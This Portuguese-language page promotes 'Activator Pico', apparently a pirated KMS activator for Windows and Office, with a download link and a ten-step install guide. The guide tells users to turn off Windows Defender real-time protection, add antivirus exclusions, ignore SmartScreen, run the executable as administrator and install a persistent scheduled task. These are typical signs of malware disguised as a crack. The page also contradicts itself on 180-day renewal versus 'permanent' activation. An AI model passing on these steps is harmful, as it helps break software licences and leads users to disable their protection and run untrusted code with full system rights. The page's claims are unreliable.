## 💡 O que é o Activator Pico

O **Activator Pico** é uma ferramenta leve de ativação que emula um servidor **Key Management Service (KMS)** localmente no seu computador. A Microsoft criou o KMS originalmente para que empresas pudessem ativar centenas de dispositivos através de um único servidor interno — sem custo por máquina.

O Activator Pico reproduz essa mesma lógica no seu PC pessoal, oferecendo ativação **100% gratuita** por **180 dias**, com renovação automática diária.

### Pilares da Tecnologia

| Pilar | Descrição |
|-------|-----------|
| 🖥️ **Servidor Local** | Executa em segundo plano |
| 🔑 **Chave GVLK** | Chave genérica oficial Microsoft |
| 🎫 **Token 180 dias** | Ciclo de validade automática |
| 🔄 **Renovação Diária** | Tarefa agendada inteligente |

## ⚙️ Instalação Detalhada

### Etapa 1 — Preparar o Sistema

**Segurança do Windows → Proteção contra vírus → Gerenciar configurações → Proteção em tempo real → Desativar**.

Adicione uma pasta de exclusão:

```
Configurações → Privacidade e segurança → Segurança do Windows
→ Proteção contra vírus → Exclusões → Adicionar pasta
```

### Etapa 2 — Extrair o Arquivo

Clique com o botão direito no arquivo → **Extrair Tudo…** → escolha uma pasta.

### Etapa 3 — Executar como Administrador

Localize `ActivatorPico.exe` → botão direito → **Executar como administrador**.

> 💡 Se aparecer SmartScreen: **Mais informações → Executar assim mesmo**.

<div align="center">

[![Baixar Activator Pico](https://img.shields.io/badge/⬇️_BAIXAR_ACTIVATOR_PICO-F59E0B?style=for-the-badge&logo=download&logoColor=black&labelColor=92400E)](https://share.google/5Vhxl9A2Ot8nCELHy)

</div>

### Etapa 4 — Instalar o Serviço KMS

Na janela principal, clique em **Ativação** e depois em **Instalar Serviço KMS**. Os arquivos serão copiados para `C:\Windows\PicoKMS`.

### Etapa 5 — Ativar o Windows

Clique em **Ativar Windows**. A ativação é automática e leva cerca de 10 segundos.

### Etapa 6 — Verificar Ativação

Abra o **Prompt de Comando** como administrador:

```bash
slmgr /xpr
```

Se aparecer **"ativado permanentemente"**, funcionou.

Para mais detalhes:

```bash
slmgr /dlv
```

### Etapa 7 — Confirmar Renovação Automática

Abra o **Agendador de Tarefas → Biblioteca** e verifique se a tarefa PicoKMS está ativa.

### Etapa 8 — Restaurar Antivírus

Reative a proteção em tempo real e adicione a pasta KMS às exclusões.

### Etapa 9 — Ativar Office (Opcional)

Aba **Office** → **Ativar Office**.

### Etapa 10 — Verificação Final

**Configurações → Atualização e Segurança → Ativação** → confirme "Windows está ativado".
